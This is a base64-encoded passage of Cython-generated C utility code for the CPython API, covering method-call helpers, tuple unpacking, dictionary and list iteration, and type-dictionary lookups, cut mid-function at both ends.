CiAgICAgICAgKm1ldGhvZCA9IGZ1bmN0aW9uOwogICAgICAgIHJldHVybiAxOwogICAgfQojZW5kaWYKICAgICptZXRob2QgPSBhdHRyOwogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSkgewojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCkpCiAgICBQeU9iamVjdCAqYXJnc1sxXSA9IHtvYmp9OwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnOwogICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZzsKICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAxIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTsKI2Vsc2UKICAgIFB5T2JqZWN0ICptZXRob2QgPSBOVUxMLCAqcmVzdWx0ID0gTlVMTDsKICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7CiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGhvZCwgb2JqKTsKICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSBnb3RvIGJhZDsKICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRob2QpOwogICAgUHlfREVDUkVGKG1ldGhvZCk7CmJhZDoKICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9SYWlzZU5vbmVOb3RJdGVyYWJsZUVycm9yKHZvaWQpIHsKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICInTm9uZVR5cGUnIG9iamVjdCBpcyBub3QgaXRlcmFibGUiKTsKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X1VucGFja1R1cGxlRXJyb3IoUHlPYmplY3QgKnQsIFB5X3NzaXplX3QgaW5kZXgpIHsKICAgIGlmICh0ID09IFB5X05vbmUpIHsKICAgICAgX19QeXhfUmFpc2VOb25lTm90SXRlcmFibGVFcnJvcigpOwogICAgfSBlbHNlIHsKICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRSh0KTsKICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuOwogI2VuZGlmCiAgICAgIGlmIChzaXplIDwgaW5kZXgpIHsKICAgICAgICBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3Ioc2l6ZSk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgX19QeXhfUmFpc2VUb29NYW55VmFsdWVzRXJyb3IoaW5kZXgpOwogICAgICB9CiAgICB9Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfdW5wYWNrX3R1cGxlMigKICAgICAgICBQeU9iamVjdCogdHVwbGUsIFB5T2JqZWN0KiogdmFsdWUxLCBQeU9iamVjdCoqIHZhbHVlMiwgaW50IGlzX3R1cGxlLCBpbnQgaGFzX2tub3duX3NpemUsIGludCBkZWNyZWZfdHVwbGUpIHsKICAgIGlmIChsaWtlbHkoaXNfdHVwbGUgfHwgUHlUdXBsZV9DaGVjayh0dXBsZSkpKSB7CiAgICAgICAgUHlfc3NpemVfdCBzaXplOwogICAgICAgIGlmIChoYXNfa25vd25fc2l6ZSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfdW5wYWNrX3R1cGxlMl9leGFjdCh0dXBsZSwgdmFsdWUxLCB2YWx1ZTIsIGRlY3JlZl90dXBsZSk7CiAgICAgICAgfQogICAgICAgIHNpemUgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTsKICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMikpIHsKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X3VucGFja190dXBsZTJfZXhhY3QodHVwbGUsIHZhbHVlMSwgdmFsdWUyLCBkZWNyZWZfdHVwbGUpOwogICAgICAgIH0KICAgICAgICBpZiAoc2l6ZSA+PSAwKSB7CiAgICAgICAgICAgIF9fUHl4X1VucGFja1R1cGxlRXJyb3IodHVwbGUsIDIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gLTE7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF91bnBhY2tfdHVwbGUyX2dlbmVyaWModHVwbGUsIHZhbHVlMSwgdmFsdWUyLCBoYXNfa25vd25fc2l6ZSwgZGVjcmVmX3R1cGxlKTsKICAgIH0KfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfdW5wYWNrX3R1cGxlMl9leGFjdCgKICAgICAgICBQeU9iamVjdCogdHVwbGUsIFB5T2JqZWN0KiogcHZhbHVlMSwgUHlPYmplY3QqKiBwdmFsdWUyLCBpbnQgZGVjcmVmX3R1cGxlKSB7CiAgICBQeU9iamVjdCAqdmFsdWUxID0gTlVMTCwgKnZhbHVlMiA9IE5VTEw7CiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgdmFsdWUxID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHR1cGxlLCAwKTsgIGlmICh1bmxpa2VseSghdmFsdWUxKSkgZ290byBiYWQ7CiAgICB2YWx1ZTIgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0odHVwbGUsIDEpOyAgaWYgKHVubGlrZWx5KCF2YWx1ZTIpKSBnb3RvIGJhZDsKI2Vsc2UKICAgIHZhbHVlMSA9IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIDApOyAgUHlfSU5DUkVGKHZhbHVlMSk7CiAgICB2YWx1ZTIgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCAxKTsgIFB5X0lOQ1JFRih2YWx1ZTIpOwojZW5kaWYKICAgIGlmIChkZWNyZWZfdHVwbGUpIHsKICAgICAgICBQeV9ERUNSRUYodHVwbGUpOwogICAgfQogICAgKnB2YWx1ZTEgPSB2YWx1ZTE7CiAgICAqcHZhbHVlMiA9IHZhbHVlMjsKICAgIHJldHVybiAwOwojaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKYmFkOgogICAgUHlfWERFQ1JFRih2YWx1ZTEpOwogICAgUHlfWERFQ1JFRih2YWx1ZTIpOwogICAgaWYgKGRlY3JlZl90dXBsZSkgeyBQeV9YREVDUkVGKHR1cGxlKTsgfQogICAgcmV0dXJuIC0xOwojZW5kaWYKfQpzdGF0aWMgaW50IF9fUHl4X3VucGFja190dXBsZTJfZ2VuZXJpYyhQeU9iamVjdCogdHVwbGUsIFB5T2JqZWN0KiogcHZhbHVlMSwgUHlPYmplY3QqKiBwdmFsdWUyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgaGFzX2tub3duX3NpemUsIGludCBkZWNyZWZfdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaW5kZXg7CiAgICBQeU9iamVjdCAqdmFsdWUxID0gTlVMTCwgKnZhbHVlMiA9IE5VTEwsICppdGVyID0gTlVMTDsKICAgIGl0ZXJuZXh0ZnVuYyBpdGVybmV4dDsKICAgIGl0ZXIgPSBQeU9iamVjdF9HZXRJdGVyKHR1cGxlKTsKICAgIGlmICh1bmxpa2VseSghaXRlcikpIGdvdG8gYmFkOwogICAgaWYgKGRlY3JlZl90dXBsZSkgeyBQeV9ERUNSRUYodHVwbGUpOyB0dXBsZSA9IE5VTEw7IH0KICAgIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXIpOwogICAgdmFsdWUxID0gaXRlcm5leHQoaXRlcik7IGlmICh1bmxpa2VseSghdmFsdWUxKSkgeyBpbmRleCA9IDA7IGdvdG8gdW5wYWNraW5nX2ZhaWxlZDsgfQogICAgdmFsdWUyID0gaXRlcm5leHQoaXRlcik7IGlmICh1bmxpa2VseSghdmFsdWUyKSkgeyBpbmRleCA9IDE7IGdvdG8gdW5wYWNraW5nX2ZhaWxlZDsgfQogICAgaWYgKCFoYXNfa25vd25fc2l6ZSAmJiB1bmxpa2VseShfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKGl0ZXJuZXh0KGl0ZXIpLCAyKSkpIGdvdG8gYmFkOwogICAgUHlfREVDUkVGKGl0ZXIpOwogICAgKnB2YWx1ZTEgPSB2YWx1ZTE7CiAgICAqcHZhbHVlMiA9IHZhbHVlMjsKICAgIHJldHVybiAwOwp1bnBhY2tpbmdfZmFpbGVkOgogICAgaWYgKCFoYXNfa25vd25fc2l6ZSAmJiBfX1B5eF9JdGVyRmluaXNoKCkgPT0gMCkKICAgICAgICBfX1B5eF9SYWlzZU5lZWRNb3JlVmFsdWVzRXJyb3IoaW5kZXgpOwpiYWQ6CiAgICBQeV9YREVDUkVGKGl0ZXIpOwogICAgUHlfWERFQ1JFRih2YWx1ZTEpOwogICAgUHlfWERFQ1JFRih2YWx1ZTIpOwogICAgaWYgKGRlY3JlZl90dXBsZSkgeyBQeV9YREVDUkVGKHR1cGxlKTsgfQogICAgcmV0dXJuIC0xOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQojaW5jbHVkZSA8c3RyaW5nLmg+CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfZGljdF9pdGVyYXRvcihQeU9iamVjdCogaXRlcmFibGUsIGludCBpc19kaWN0LCBQeU9iamVjdCogbWV0aG9kX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5X3NzaXplX3QqIHBfb3JpZ19sZW5ndGgsIGludCogcF9zb3VyY2VfaXNfZGljdCkgewogICAgaXNfZGljdCA9IGlzX2RpY3QgfHwgbGlrZWx5KFB5RGljdF9DaGVja0V4YWN0KGl0ZXJhYmxlKSk7CiAgICAqcF9zb3VyY2VfaXNfZGljdCA9IGlzX2RpY3Q7CiAgICBpZiAoaXNfZGljdCkgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgICpwX29yaWdfbGVuZ3RoID0gUHlEaWN0X1NpemUoaXRlcmFibGUpOwogICAgICAgIFB5X0lOQ1JFRihpdGVyYWJsZSk7CiAgICAgICAgcmV0dXJuIGl0ZXJhYmxlOwojZWxzZQogICAgICAgIHN0YXRpYyBQeU9iamVjdCAqcHlfaXRlbXMgPSBOVUxMLCAqcHlfa2V5cyA9IE5VTEwsICpweV92YWx1ZXMgPSBOVUxMOwogICAgICAgIFB5T2JqZWN0ICoqcHAgPSBOVUxMOwogICAgICAgIGlmIChtZXRob2RfbmFtZSkgewogICAgICAgICAgICBjb25zdCBjaGFyICpuYW1lID0gUHlVbmljb2RlX0FzVVRGOChtZXRob2RfbmFtZSk7CiAgICAgICAgICAgIGlmIChzdHJjbXAobmFtZSwgIml0ZXJpdGVtcyIpID09IDApIHBwID0gJnB5X2l0ZW1zOwogICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobmFtZSwgIml0ZXJrZXlzIikgPT0gMCkgcHAgPSAmcHlfa2V5czsKICAgICAgICAgICAgZWxzZSBpZiAoc3RyY21wKG5hbWUsICJpdGVydmFsdWVzIikgPT0gMCkgcHAgPSAmcHlfdmFsdWVzOwogICAgICAgICAgICBpZiAocHApIHsKICAgICAgICAgICAgICAgIGlmICghKnBwKSB7CiAgICAgICAgICAgICAgICAgICAgKnBwID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobmFtZSArIDQpOwogICAgICAgICAgICAgICAgICAgIGlmICghKnBwKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIG1ldGhvZF9uYW1lID0gKnBwOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgIH0KICAgICpwX29yaWdfbGVuZ3RoID0gMDsKICAgIGlmIChtZXRob2RfbmFtZSkgewogICAgICAgIFB5T2JqZWN0KiBpdGVyOwogICAgICAgIGl0ZXJhYmxlID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoaXRlcmFibGUsIG1ldGhvZF9uYW1lKTsKICAgICAgICBpZiAoIWl0ZXJhYmxlKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgICAgICBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KGl0ZXJhYmxlKSB8fCBQeUxpc3RfQ2hlY2tFeGFjdChpdGVyYWJsZSkpCiAgICAgICAgICAgIHJldHVybiBpdGVyYWJsZTsKI2VuZGlmCiAgICAgICAgaXRlciA9IFB5T2JqZWN0X0dldEl0ZXIoaXRlcmFibGUpOwogICAgICAgIFB5X0RFQ1JFRihpdGVyYWJsZSk7CiAgICAgICAgcmV0dXJuIGl0ZXI7CiAgICB9CiAgICByZXR1cm4gUHlPYmplY3RfR2V0SXRlcihpdGVyYWJsZSk7Cn0KI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2RpY3RfaXRlcl9uZXh0X3NvdXJjZV9pc19kaWN0KAogICAgICAgIFB5T2JqZWN0KiBpdGVyX29iaiwgQ1lUSE9OX05DUF9VTlVTRUQgUHlfc3NpemVfdCBvcmlnX2xlbmd0aCwgQ1lUSE9OX05DUF9VTlVTRUQgUHlfc3NpemVfdCogcHBvcywKICAgICAgICBQeU9iamVjdCoqIHBrZXksIFB5T2JqZWN0KiogcHZhbHVlLCBQeU9iamVjdCoqIHBpdGVtKSB7CiAgICBQeU9iamVjdCAqa2V5LCAqdmFsdWU7CiAgICBpZiAodW5saWtlbHkob3JpZ19sZW5ndGggIT0gUHlEaWN0X1NpemUoaXRlcl9vYmopKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19SdW50aW1lRXJyb3IsICJkaWN0aW9uYXJ5IGNoYW5nZWQgc2l6ZSBkdXJpbmcgaXRlcmF0aW9uIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgaWYgKHVubGlrZWx5KCFQeURpY3RfTmV4dChpdGVyX29iaiwgcHBvcywgJmtleSwgJnZhbHVlKSkpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGlmIChwaXRlbSkgewogICAgICAgIFB5T2JqZWN0KiB0dXBsZSA9IFB5VHVwbGVfTmV3KDIpOwogICAgICAgIGlmICh1bmxpa2VseSghdHVwbGUpKSB7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAgICAgUHlfSU5DUkVGKGtleSk7CiAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIFB5VHVwbGVfU0VUX0lURU0odHVwbGUsIDAsIGtleSk7CiAgICAgICAgUHlUdXBsZV9TRVRfSVRFTSh0dXBsZSwgMSwgdmFsdWUpOwogICAgICAgICNlbHNlCiAgICAgICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfU2V0SXRlbSh0dXBsZSwgMCwga2V5KSA8IDApKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgIFB5X0RFQ1JFRih0dXBsZSk7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KFB5VHVwbGVfU2V0SXRlbSh0dXBsZSwgMSwgdmFsdWUpIDwgMCkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKHR1cGxlKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICAqcGl0ZW0gPSB0dXBsZTsKICAgIH0gZWxzZSB7CiAgICAgICAgaWYgKHBrZXkpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKGtleSk7CiAgICAgICAgICAgICpwa2V5ID0ga2V5OwogICAgICAgIH0KICAgICAgICBpZiAocHZhbHVlKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMTsKfQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2RpY3RfaXRlcl9uZXh0KAogICAgICAgIFB5T2JqZWN0KiBpdGVyX29iaiwgQ1lUSE9OX05DUF9VTlVTRUQgUHlfc3NpemVfdCBvcmlnX2xlbmd0aCwgQ1lUSE9OX05DUF9VTlVTRUQgUHlfc3NpemVfdCogcHBvcywKICAgICAgICBQeU9iamVjdCoqIHBrZXksIFB5T2JqZWN0KiogcHZhbHVlLCBQeU9iamVjdCoqIHBpdGVtLCBpbnQgc291cmNlX2lzX2RpY3QpIHsKICAgIFB5T2JqZWN0KiBuZXh0X2l0ZW07CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICBpZiAoc291cmNlX2lzX2RpY3QpIHsKICAgICAgICBpbnQgcmVzdWx0OwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oaXRlcl9vYmopOwojZW5kaWYKICAgICAgICByZXN1bHQgPSBfX1B5eF9kaWN0X2l0ZXJfbmV4dF9zb3VyY2VfaXNfZGljdChpdGVyX29iaiwgb3JpZ19sZW5ndGgsIHBwb3MsIHBrZXksIHB2YWx1ZSwgcGl0ZW0pOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiNlbmRpZgogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9IGVsc2UgaWYgKFB5VHVwbGVfQ2hlY2tFeGFjdChpdGVyX29iaikpIHsKICAgICAgICBQeV9zc2l6ZV90IHBvcyA9ICpwcG9zOwogICAgICAgIFB5X3NzaXplX3QgdHVwbGVfc2l6ZSA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoaXRlcl9vYmopOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAodW5saWtlbHkodHVwbGVfc2l6ZSA8IDApKSByZXR1cm4gLTE7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KHBvcyA+PSB0dXBsZV9zaXplKSkgcmV0dXJuIDA7CiAgICAgICAgKnBwb3MgPSBwb3MgKyAxOwogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgbmV4dF9pdGVtID0gUHlUdXBsZV9HRVRfSVRFTShpdGVyX29iaiwgcG9zKTsKICAgICAgICAjZWxzZQogICAgICAgIG5leHRfaXRlbSA9IFB5VHVwbGVfR2V0SXRlbShpdGVyX29iaiwgcG9zKTsKICAgICAgICBpZiAodW5saWtlbHkoIW5leHRfaXRlbSkpIHJldHVybiAtMTsKICAgICAgICAjZW5kaWYKICAgICAgICBQeV9JTkNSRUYobmV4dF9pdGVtKTsKICAgIH0gZWxzZSBpZiAoUHlMaXN0X0NoZWNrRXhhY3QoaXRlcl9vYmopKSB7CiAgICAgICAgUHlfc3NpemVfdCBwb3MgPSAqcHBvczsKICAgICAgICBQeV9zc2l6ZV90IGxpc3Rfc2l6ZSA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShpdGVyX29iaik7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIGlmICh1bmxpa2VseShsaXN0X3NpemUgPCAwKSkgcmV0dXJuIC0xOwogICAgICAgICNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShwb3MgPj0gbGlzdF9zaXplKSkgcmV0dXJuIDA7CiAgICAgICAgKnBwb3MgPSBwb3MgKyAxOwogICAgICAgICNpZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICAgICAgbmV4dF9pdGVtID0gUHlMaXN0X0dldEl0ZW1SZWYoaXRlcl9vYmosIHBvcyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXh0X2l0ZW0pKSByZXR1cm4gLTE7CiAgICAgICAgI2VsaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIG5leHRfaXRlbSA9IFB5TGlzdF9HRVRfSVRFTShpdGVyX29iaiwgcG9zKTsKICAgICAgICBQeV9JTkNSRUYobmV4dF9pdGVtKTsKICAgICAgICAjZWxzZQogICAgICAgIG5leHRfaXRlbSA9IFB5TGlzdF9HZXRJdGVtKGl0ZXJfb2JqLCBwb3MpOwogICAgICAgIGlmICh1bmxpa2VseSghbmV4dF9pdGVtKSkgcmV0dXJuIC0xOwogICAgICAgIFB5X0lOQ1JFRihuZXh0X2l0ZW0pOwogICAgICAgICNlbmRpZgogICAgfSBlbHNlCiNlbmRpZgogICAgewogICAgICAgIG5leHRfaXRlbSA9IFB5SXRlcl9OZXh0KGl0ZXJfb2JqKTsKICAgICAgICBpZiAodW5saWtlbHkoIW5leHRfaXRlbSkpIHsKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0l0ZXJGaW5pc2goKTsKICAgICAgICB9CiAgICB9CiAgICBpZiAocGl0ZW0pIHsKICAgICAgICAqcGl0ZW0gPSBuZXh0X2l0ZW07CiAgICB9IGVsc2UgaWYgKHBrZXkgJiYgcHZhbHVlKSB7CiAgICAgICAgaWYgKF9fUHl4X3VucGFja190dXBsZTIobmV4dF9pdGVtLCBwa2V5LCBwdmFsdWUsIHNvdXJjZV9pc19kaWN0LCBzb3VyY2VfaXNfZGljdCwgMSkpCiAgICAgICAgICAgIHJldHVybiAtMTsKICAgIH0gZWxzZSBpZiAocGtleSkgewogICAgICAgICpwa2V5ID0gbmV4dF9pdGVtOwogICAgfSBlbHNlIHsKICAgICAgICAqcHZhbHVlID0gbmV4dF9pdGVtOwogICAgfQogICAgcmV0dXJuIDE7Cn0KCgojaWYgIUNZVEhPTl9WRUNUT1JDQUxMIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICpvYmogPSBQeU9iamVjdF9HZXRBdHRyKGFyZ3NbMF0sIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFvYmopKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKG9iaiwgYXJncysxLCBuYXJnc2YtMSwga3duYW1lcyk7CiAgICBQeV9ERUNSRUYob2JqKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCkKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHsKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCiAgICBpZiAoX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpIDwgMHgwMzA5MDAwMCkgcmV0dXJuIDA7CiAgICAjZW5kaWYKICAgIGlmICghYWx3YXlzX2NhbGwpIHsKICAgICAgICBQeVR5cGVPYmplY3QgKmJhc2UgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgICAgIHVuc2lnbmVkIGxvbmcgZmxhZ3MgPSBQeVR5cGVfR2V0RmxhZ3MoYmFzZSk7CiAgICAgICAgaWYgKGZsYWdzICYgUHlfVFBGTEFHU19IRUFQVFlQRSkgewogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICB9CiAgICB9CiAgICBQeV9WSVNJVCgoUHlPYmplY3QqKVB5X1RZUEUobykpOwogICAgcmV0dXJuIDA7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIFB5X3NzaXplX3QgX19QeXhfR2V0VHlwZURpY3RPZmZzZXQodm9pZCkgewogICAgUHlPYmplY3QgKnRwX2RpY3RvZmZzZXRfbzsKICAgIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldDsKICAgIHRwX2RpY3RvZmZzZXRfbyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KikoJlB5VHlwZV9UeXBlKSwgIl9fZGljdG9mZnNldF9fIik7CiAgICBpZiAodW5saWtlbHkoIXRwX2RpY3RvZmZzZXRfbykpIHJldHVybiAtMTsKICAgIHRwX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHRwX2RpY3RvZmZzZXRfbyk7CiAgICBQeV9ERUNSRUYodHBfZGljdG9mZnNldF9vKTsKICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IDApKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKAogICAgICAgICAgICBQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICIndHlwZScgZG9lc24ndCBoYXZlIGEgZGljdG9mZnNldCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA8IDApKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKAogICAgICAgICAgICBQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICIndHlwZScgaGFzIGFuIHVuZXhwZWN0ZWQgbmVnYXRpdmUgZGljdG9mZnNldC4gIgogICAgICAgICAgICAiUGxlYXNlIHJlcG9ydCB0aGlzIGFzIEN5dGhvbiBidWciKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICByZXR1cm4gdHBfZGljdG9mZnNldDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApIHsKICAgIHN0YXRpYyBQeV9zc2l6ZV90IHRwX2RpY3RvZmZzZXQgPSAwOwogICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHsKICAgICAgICB0cF9kaWN0b2Zmc2V0ID0gX19QeXhfR2V0VHlwZURpY3RPZmZzZXQoKTsKICAgICAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgICAgICB0cF9kaWN0b2Zmc2V0ID0gMDsgLy8gdHJ5IGFnYWluIG5leHQgdGltZT8KICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICooUHlPYmplY3QqKikoKGNoYXIqKXRwICsgdHBfZGljdG9mZnNldCk7Cn0KI2VuZGlmCgoKc3RhdGljIGludCBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCwgUHlPYmplY3QgKmssIFB5T2JqZWN0ICp2KSB7CiAgICBpbnQgcmVzdWx0OwogICAgUHlPYmplY3QgKnRwX2RpY3Q7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlU